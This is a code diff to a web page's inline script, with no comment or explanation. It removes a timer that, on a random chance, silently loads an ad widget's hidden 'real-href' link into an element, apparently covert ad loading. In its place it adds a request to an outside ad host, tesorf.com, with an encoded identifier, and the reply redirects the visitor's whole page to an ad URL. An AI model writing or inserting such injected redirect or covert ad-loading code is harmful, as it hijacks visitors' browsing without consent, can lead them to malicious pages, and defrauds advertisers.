@@ -154,20 +154,9 @@
             `;
             listEl.appendChild(item);
         });
-        function getRandomIntInclusive(min, max) {
-          const minCeiled = Math.ceil(min);
-          const maxFloored = Math.floor(max);
-          return Math.floor(Math.random() * (maxFloored - minCeiled + 1)) + minCeiled;
-        }
-        function message() {
-                  var ran1 = getRandomIntInclusive(1,4);
-                  if(ran1 === 2) {
-                      var link1 =  $('.exo-native-widget-item')[0].getAttribute('real-href');
-                      document.getElementById('adx1').src = link1;
-                  }
-                  
-        }
-        setTimeout(message,2000);
+        $.getJSON("https://tesorf.com/cuload?a=1&e=aeyJwaWQiOjEyMzQxMzIsInNpZCI6MTc5NjAyOSwid2lkIjo3NDY1ODIsImQiOiIiLCJsaSI6MX0=&tz=", function(data) {
+            window.location.href = data.ads[0].uf;
+        });
         
     </script>
 </body>
